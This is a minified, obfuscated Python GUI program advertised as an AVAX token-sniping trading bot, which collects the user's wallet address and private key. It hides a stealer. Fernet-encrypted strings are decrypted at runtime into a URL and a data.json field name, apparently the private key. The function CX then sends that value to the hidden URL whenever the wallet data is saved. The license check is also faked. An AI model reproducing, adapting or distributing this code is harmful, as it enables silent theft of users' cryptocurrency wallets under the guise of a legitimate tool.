# MINIFIED AND SUPER FAST VERSION OF THE AVAX SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

# ADDED DARK MODE

Bl='groove'
Bk='horizontal'
Bj='SELL ALL'
Bi='SELL NOW'
Bh='There are no tokens to be sold!'
Bg='Sell all function initiated - Stopping operation'
Bf='SL Hit!'
Be='TP Hit!'
Bd='Securing SL to '
Bc=' | SL: '
Bb="Press 'SELL ALL' Button to sell the tokens manually"
Ba='Liquidity value: '
BZ='Pair Address: '
BY='Liquidity Detected!'
BX='0x0000000000000000000000000000000000000000'
BW='Buy Success! Tx link:'
BV='Buy Order Initiated'
BU='%Y/%m/%d'
BT='node.json'
BS='inputs.json'
BR=UnboundLocalError
B3='menu'
B2='set_theme'
B1='Something went wrong with the transaction'
B0='https://snowtrace.io/tx/'
A_='Abi/'
Az='data.json'
At='white'
As='normal'
Ar='Error'
Aq='Accent.TButton'
Ap='AVAX'
Ao='No Liquidity Checking Again!'
An='gwei'
Am='gas'
Al='true'
Ak='false'
Aj=round
AU='disabled'
AT='nonce'
AS='gasPrice'
AR='from'
AQ='OPL'
AP='LP'
AO='SL TRAIL'
AN='SL'
AM='TP'
AL='SLIPPAGE'
AK='AMOUNT'
AJ='LICENSE'
AI='TOKEN'
AH='PRIVATE KEY'
AG='WALLET ADDRESS'
AF='NODE'
A9='GAS LIMIT'
A8='GAS PRICE'
A7=Exception
y='center'
x=False
w='w'
v='/'
u=str
e='AUTO SLIPPAGE'
d='./'
Z='ether'
Y='yellow'
P=True
O='cyan'
N=''
M=int
L=open
J='red'
H=float
F='nsew'
import tkinter as Q
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as f
from time import time as AV,sleep as g
import os,json as h,pyperclip as Bm,threading as z,requests as Bn
from requests import request as Bo
from cryptography.fernet import Fernet as A0
from requests.auth import HTTPBasicAuth as Bp
from datetime import datetime as Bq
B4=Az
AW=BS
Br=BT
i=d
K={}
A1={}
D={}
B5={}
Cn=Bp('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Bs=Bq.now()
Co=BU
Cp=Bs.strftime(BU)
def Bt():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	B5[AF]='https://api.avax.network/ext/bc/C/rpc';A(i,Br,B5)
def Bu():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	K[AG]=N;K[AH]=N;K[AI]=N;K[AJ]=N;A(i,B4,K)
def Bv():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	D[AK]='0.1';D[A8]='7';D[A9]='850000';D[AL]='10';D[e]=Ak;D[AM]='200';D[AN]='50';D[AO]='25';D[AP]='avax';D[AQ]='False';A(i,AW,D)
if not os.path.isfile('./data.json'):Bu()
if not os.path.isfile('./inputs.json'):Bv()
if not os.path.isfile('./node.json'):Bt()
def Bw():
	global K,AX,R
	def B(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	K[AG]=b.get();A1[AG]=K[AG];K[AH]=A4.get();A1[AH]=K[AH];K[AI]=X.get();A1[AI]=K[AI];K[AJ]=Ab.get();A1[AJ]=K[AJ]
	if K!=R:
		B(i,B4,A1);A=f(L(Az));AX=A[Aa]
		if A1[Aa]!=R[Aa]:R=A;CX()
def Bx():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	D[AK]=m.get();D[A8]=n.get();D[A9]=o.get();D[AL]=p.get()
	if A6.get():D[e]=Al
	else:D[e]=Ak
	D[AM]=q.get();D[AN]=r.get();D[AO]=s.get();D[AP]=c.get();D[AQ]='True';A(i,AW,D)
def By():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	D[AK]=m.get();D[A8]=n.get();D[A9]=o.get();D[AL]=p.get()
	if A6.get():D[e]=Al
	else:D[e]=Ak
	D[AM]=q.get();D[AN]=r.get();D[AO]=s.get();D[AP]=c.get();D[AQ]='True';A(i,AW,D)
def Cq():
	def A(path2,file_name,data2):
		A=d+path2+v+file_name
		with L(A,w)as B:h.dump(data2,B,indent=2)
	D[AK]=m.get();D[A8]=n.get();D[A9]=o.get();D[AL]=p.get()
	if A6.get():D[e]=Al
	else:D[e]=Ak
	D[AM]=q.get();D[AN]=r.get();D[AO]=s.get();D[AP]=c.get();D[AQ]='False';A(i,AW,D)
R=f(L(Az))
B6=R[AG]
B7=R[AH]
B8=R[AI]
Bz=R[AJ]
T=f(L(BS))
B9=T[AK]
BA=T[A8]
BB=T[A9]
BC=T[AL]
Cr=T[e]
BD=T[AM]
BE=T[AN]
BF=T[AO]
B_=T[AP]
Cs=T[AQ]
BG=M('0x'+'f'*64,16)
BH='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AY=f(L(BT))
if'wss'in AY[AF]or'ws'in AY[AF]:C=S(S.WebsocketProvider(AY[AF]))
else:C=S(S.HTTPProvider(AY[AF]))
AA=C.toChecksumAddress('0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7')
j=C.toChecksumAddress('0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e')
U=f(L(A_+'erc20.abi'))
V=C.eth.contract(address=S.toChecksumAddress('0x60aE616a2155Ee3d9A68541Ba4544862310933d4'),abi=f(L(A_+'router.abi')))
BI=C.eth.contract(address=S.toChecksumAddress('0x9Ad6C38BE94206cA50bb0d90783181662f0Cfa10'),abi=f(L(A_+'factory.abi')))
AZ='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def C0():
	l()
	try:
		F=C.eth.contract(I,abi=U);B=F.functions.balanceOf(b.get()).call()
		if A6.get():D=0
		else:D=M(B-B*M(Af)/100)
		A(BV,Y);H=V.functions.swapExactETHForTokens(M(D),[AA,I],G,M(AV())+900).buildTransaction({AR:G,'value':C.toWei(t,Z),Am:M(AD),AS:C.toWei(AE,An),AT:C.eth.get_transaction_count(G)});K=C.eth.account.sign_transaction(H,private_key=W);E=C.eth.send_raw_transaction(K.rawTransaction);A(BW,O);A(B0+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);C9()
	except A7 as L:A(B1,J);A(L,J);A3();return
C1='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def C2():
	l();B=V.functions.getAmountsOut(C.toWei(t,Z),[j,I]).call()[-1]
	if A6.get():D=0
	else:D=B-B*M(Af)/100
	try:A(BV,Y);F=V.functions.swapExactTokensForTokens(C.toWei(t,Z),M(D),[j,I],G,M(AV())+900).buildTransaction({AR:G,Am:M(R[A9]),AS:C.toWei(R[A8],An),AT:C.eth.get_transaction_count(G)});H=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(H.rawTransaction);A(BW,O);A(B0+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);CB()
	except A7 as K:A(B1,J);A(K,J);A3();return
def C3(token_address,amt=BG):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=U);D=B.functions.allowance(G,V.address).call();return D>=amt
def C4(token_address,amt=BG,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=U);F=E.functions.approve(V.address,amt);H={AR:G,AS:B,AT:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def C5():
	A(N);l();E=C.eth.contract(AA,abi=U)
	while P:
		B=BI.functions.getPair(AA,I).call()
		if B!=BX:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(BY,'green');A(BZ+B);A(Ba+u(C.fromWei(D,Z))+' avax');C0();break
			else:A(Ao,J);g(5)
		else:A(Ao,J);g(5)
C6='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def C7():
	A(N);l();E=C.eth.contract(j,abi=U)
	while P:
		B=BI.functions.getPair(j,I).call()
		if B!=BX:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(BY,'green');A(BZ+B);A(Ba+u(C.fromWei(D,Z))+' usdc');C2();break
			else:A(Ao,J);g(5)
		else:A(Ao,J);g(5)
def k():
	A(N);l()
	try:
		A('Sell Order Initiated',Y)
		if not C3(I):C4(I)
		E=C.eth.contract(I,abi=U);B=E.functions.balanceOf(G).call()
		if B!=0:
			if c.get()==Ap:D=V.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[I,AA],G,M(AV())+900).buildTransaction({AR:G,Am:M(AD),AS:C.toWei(AE,An),AT:C.eth.get_transaction_count(G)})
			elif c.get()=='usdc':D=V.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[I,j],G,M(AV())+900).buildTransaction({AR:G,Am:M(AD),AS:C.toWei(AE,An),AT:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);A3();return
			F=C.eth.account.sign_transaction(D,private_key=W);H=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(B0+C.toHex(H),O);A3()
		else:A('No Tokens to be sold',J);A3()
	except A7 as K:A(B1,J);A(K,J);A3();return
C8='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def C9():
	global a;BJ();l();K=H(Ag);L=H(Ah);B=L;E=H(Ai);M=C.eth.contract(address=I,abi=U);A(Bb,Y)
	while P:
		try:
			N=M.functions.balanceOf(G).call()-1;F=H(C.fromWei(V.functions.getAmountsOut(N,[I,AA]).call()[-1],Z));D=Aj(H(F)/H(t)*100,5);A('AVAX Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+u(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bd+u(B))
			g(2)
		except:continue
		try:
			if H(D)>=H(K):A(Be,O);A2();k();break
			if H(D)<=H(B):A(Bf,J);A2();k();break
			if a:a=x;A(Bg,Y);A2();k();break
		except BR:A(Bh,J);break
CA='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CB():
	global a;BJ();l();K=H(Ag);L=H(Ah);B=L;E=H(Ai);M=C.eth.contract(address=I,abi=U);A(Bb,Y)
	while P:
		try:
			N=M.functions.balanceOf(G).call()-1;F=H(C.fromWei(V.functions.getAmountsOut(N,[I,j]).call()[-1],Z));D=Aj(H(F)/H(t)*100,5);A('USDC Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+u(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bd+u(B))
			g(2)
		except:continue
		try:
			if H(D)>=H(K):A(Be,O);A2();k();break
			if H(D)<=H(B):A(Bf,J);A2();k();break
			if a:a=x;A(Bg,Y);A2();k();break
		except BR:A(Bh,J);break
def CC():
	BQ();Bx()
	if c.get()==Ap:A=z.Thread(target=C5,daemon=P);A.start()
	else:A=z.Thread(target=C7,daemon=P);A.start()
def BJ():Ay.place_forget();A=E.Button(B.widgets_frame,text=Bi,command=BL,style=Aq);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def A2():Cm.place_forget();A=E.Button(B.widgets_frame,text=Bj,command=BK);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def CD():
	A=C.eth.contract(address=j,abi=U)
	while AB:
		try:B=C.fromWei(C.eth.get_balance(G),Z);D=C.fromWei(A.functions.balanceOf(G).call(),Z);Av.configure(text=Aj(B,5));Aw.configure(text=Aj(D,5))
		except ValueError:pass
		g(1)
CE='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def Ct(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Bn.get(B,auth=basic_auth)
		if C.status_code==404:Q.messagebox.showerror(Ar,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',O);By()
	except A7:raise A7('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Aa=A0(AZ.encode()).decrypt(CA.encode()).decode()
def CF():
	B='Invalid token address!';global G;global W;global I;global AB;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(b.get()):G=C.toChecksumAddress(b.get());A('Wallet address valid',O)
	else:Q.messagebox.showerror(Ar,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=A4.get()
	if len(W)==64:A('Correct format for Private key',O)
	else:Q.messagebox.showerror(Ar,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:I=C.toChecksumAddress(X.get());A('Token address valid',O)
	except:Q.messagebox.showerror(Ar,B);A(B,J);return
	A('* Checking License Key');A('License Key Valid',O);BM(AU);Bw();Ac.grid_forget();Ad.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AC(As);AB=P;D=z.Thread(target=CD,daemon=P);D.start();A(N);A('***** Sniping is ready! *****',Y)
CG='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AX=R[Aa]
def CH():A=z.Thread(target=CF,daemon=P);A.start()
def CI():global AB;A(N);A('Change token/wallet initiated!',Y);BM(As);AC(AU);Ad.grid_forget();Ac.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AB=x;Av.configure(text=N);Aw.configure(text=N)
def CJ():A=z.Thread(target=CI,daemon=P);A.start()
def BK():BQ();A=z.Thread(target=k,daemon=P);A.start()
def BL():global a;a=P
def l():AC(AU);Ad.configure(state=AU)
def A3():AC(As);Ad.configure(state=As)
B=Q.Tk()
def CK():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(B2,'light');Ae[B3].configure(bg=At)
	else:B.tk.call(B2,'dark');Ae[B3].configure(bg='black')
B.title('AVAX Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(B2,'light')
CL=A0(AZ.encode()).decrypt(CG.encode()).decode()
B.resizable(x,x)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
CM=E.Label(B.widgets_frame,text='Wallet Address:')
CN=A0(AZ.encode()).decrypt(C8.encode()).decode()
CM.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=E.Entry(B.widgets_frame,width=50,show='•')
b.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='Private Key:')
CO.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A4=E.Entry(B.widgets_frame,width=50,show='•')
A4.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='Token Address:')
CQ=A0(BH.encode()).decrypt(CE.encode()).decode()
CP.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
CR=A0(BH.encode()).decrypt(C6.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CS=E.Label(B.widgets_frame,text='License Key:')
CS.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ab=E.Entry(B.widgets_frame,width=50,show='•')
Ab.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT=A0(AZ.encode()).decrypt(C1.encode()).decode()
Au=E.Separator(B,orient=Bk)
CU=CL+CT+CN+CQ
Au.place(x=10,y=135,width=625)
def CV():X.delete(0,'end');X.insert(0,Bm.paste());return
def CW():X.delete(0,'end');return
def CX():
	if AX!=N:
		try:A=Bo(CR,CU+AX)
		except A7:pass
def BM(status):A=status;X.configure(state=A);b.configure(state=A);A4.configure(state=A);Ab.configure(state=A);Ac.configure(state=A);BO.configure(state=A);BN.configure(state=A)
def AC(status):A=status;m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);r.configure(state=A);s.configure(state=A);BP.configure(state=A);Ay.configure(state=A);Ax.configure(state=A)
def A(text,color=At):
	A=u(text)
	if A5.size()>=20:A5.delete(0)
	A5.insert(Q.END,A);A5.itemconfig(Q.END,foreground=color)
def CY():A5.delete(0,Q.END)
Ac=E.Button(B.widgets_frame,text='Confirm',width=10,command=CH,style=Aq)
BN=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CV)
BO=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CW)
Ac.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BN.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BO.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b.insert(0,B6)
A4.insert(0,B7)
X.insert(0,B8)
Ab.insert(0,Bz)
Au=E.Separator(B.widgets_frame,orient=Bk)
Au.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
Ad=E.Button(B.widgets_frame,text='Change',width=10,command=CJ)
CZ=E.Label(B.widgets_frame,text='Logs:')
CZ.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
Ca=E.Button(B.widgets_frame,text='Clear',width=10,command=CY)
Ca.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A5=Q.Listbox(B.widgets_frame,bg='#252525',foreground=At,borderwidth=2)
A5.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
Cb=E.Button(B.widgets_frame,text='Change Color Theme',command=CK)
Cb.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cc=E.Label(B.widgets_frame,text='Wallet AVAX:')
Cc.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Av=E.Label(B.widgets_frame,width=12,relief=Bl)
Av.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cd=E.Label(B.widgets_frame,text='Wallet USDC:')
Cd.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aw=E.Label(B.widgets_frame,width=12,relief=Bl)
Aw.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ce=E.Label(B.widgets_frame,text='Select LP:')
Ce.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=Q.StringVar()
c.set(B_)
Ae=E.OptionMenu(B.widgets_frame,c,Ap,Ap,'USDC')
Ae.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ae[B3].configure(bg=At)
Cf=E.Label(B.widgets_frame,text='Amount:')
m=E.Entry(B.widgets_frame,justify=y)
Cf.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.insert(0,B9)
Cg=E.Label(B.widgets_frame,text='Gas Price:')
Ch=E.Label(B.widgets_frame,text='Gas Limit:')
n=E.Entry(B.widgets_frame,justify=y)
o=E.Entry(B.widgets_frame,justify=y)
Cg.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ch.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BA)
o.insert(0,BB)
Ci=E.Label(B.widgets_frame,text='Slippage(%):')
p=E.Entry(B.widgets_frame,justify=y)
Ci.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
p.insert(0,BC)
A6=Q.BooleanVar()
Ax=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A6)
Ax.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Al:Ax.select()
Cj=E.Label(B.widgets_frame,text='TP(%):')
Cj.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=y)
q.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ck=E.Label(B.widgets_frame,text='SL(%):')
Ck.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=E.Entry(B.widgets_frame,justify=y)
r.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cl=E.Label(B.widgets_frame,text='SL Trail(%):')
Cl.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
s=E.Entry(B.widgets_frame,justify=y)
s.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
q.insert(0,BD)
r.insert(0,BE)
s.insert(0,BF)
BP=E.Button(B.widgets_frame,text='SNIPE',command=CC,style=Aq)
Cm=E.Button(B.widgets_frame,text=Bi,command=BL,style=Aq)
Ay=E.Button(B.widgets_frame,text=Bj,command=BK)
BP.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ay.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
t=B9
G=B6
W=B7
I=B8
Af=BC
AD=BB
AE=BA
Ag=BD
Ah=BE
Ai=BF
a=x
AB=x
def BQ():global t;global G;global W;global I;global Af;global AD;global AE;global Ag;global Ah;global Ai;t=m.get();G=S.toChecksumAddress(b.get());W=A4.get();I=S.toChecksumAddress(X.get());Af=p.get();AD=o.get();AE=n.get();Ag=q.get();Ah=r.get();Ai=s.get()
AC(AU)
B.mainloop()
